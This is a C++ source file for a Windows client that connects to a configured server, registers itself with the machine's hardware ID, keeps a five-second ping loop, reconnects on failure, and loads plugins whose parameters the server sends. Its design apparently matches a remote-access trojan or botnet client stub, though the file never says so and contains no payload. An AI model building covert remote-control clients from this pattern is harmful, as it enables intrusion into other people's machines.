#include "MainHandler.h"

SOCKET MainHandler::ServerSocket = NULL;

bool MainHandler::sendInitPacket() {
  Packet InitPacket(ServerSocket);
  InitPacket.setSignature(Variable::Signature::NEW_CLIENT);
  std::vector<char *> Params;

  std::string HWID = getHWID();
  Params.push_back((char *)HWID.c_str());

  InitPacket.addParam(Params);

  return InitPacket.sendPacket();
}

bool MainHandler::sendPingPacket(Packet *AlivePacket) {
  AlivePacket->setSignature(Variable::Signature::RESPONSE_SUCCESS);
  return AlivePacket->sendPacket();
}

void MainHandler::startHandler() {
  waitConnect();

  printf("Successfully Connected to Server.\n");

  while (true) {
    Packet AlivePacket(ServerSocket);
    if (AlivePacket.receivePacket()) {
      switch (AlivePacket.parseSignatureFromPayload()) {
      case Variable::Signature::PING:
        break;
      case Variable::Signature::LOAD_PLUGIN: {
        std::vector<std::string> Params = AlivePacket.parseParams();
        PluginHandler Handler(
            (char *)Params.at(1).c_str(), (char *)Params.at(2).c_str(),
            (char *)Params.at(3).c_str(), (char *)Params.at(4).c_str());
        Handler.startLoadingThread();
        printf("param_1: %s param_2: %s param_3: %s param_4: %s\n",
               Params.at(1).c_str(), Params.at(2).c_str(), Params.at(3).c_str(),
               Params.at(4).c_str());
        break;
      }
      default:
        waitConnect();
        break;
      }

      if (!sendPingPacket(&AlivePacket)) {
        waitConnect();
      } else {
        printf("ping - pong - success\n");
        Sleep(5000);
      }
    } else {
      waitConnect();
    }
  }
}

void MainHandler::handleRequest(char *Payload) {}

void MainHandler::waitConnect() {
  while (tryConnect()) {
    printf("Try to connect to server...\n");
    Sleep(5000);
  }
  if (!sendInitPacket()) {
    waitConnect();
  }
}

bool MainHandler::tryConnect() {
  WSADATA WsaData;
  WSAStartup(MAKEWORD(2, 2), &WsaData);

  ServerSocket = NULL;
  ServerSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  SOCKADDR_IN ConnectAddr = {};
  ConnectAddr.sin_family = AF_INET;
  ConnectAddr.sin_port = htons(Variable::getPort());

  /*hostent *DomainInfo = gethostbyname(ServerAddress);
  LPSTR IpInfo = inet_ntoa(*(struct in_addr *)DomainInfo->h_addr_list[0]);
  */
  ConnectAddr.sin_addr.s_addr = inet_addr(Variable::getServerAddress());

  if (connect(ServerSocket, (SOCKADDR *)&ConnectAddr, sizeof(ConnectAddr)) ==
      SOCKET_ERROR) {
    return WSAGetLastError();
  }

  return 0;
}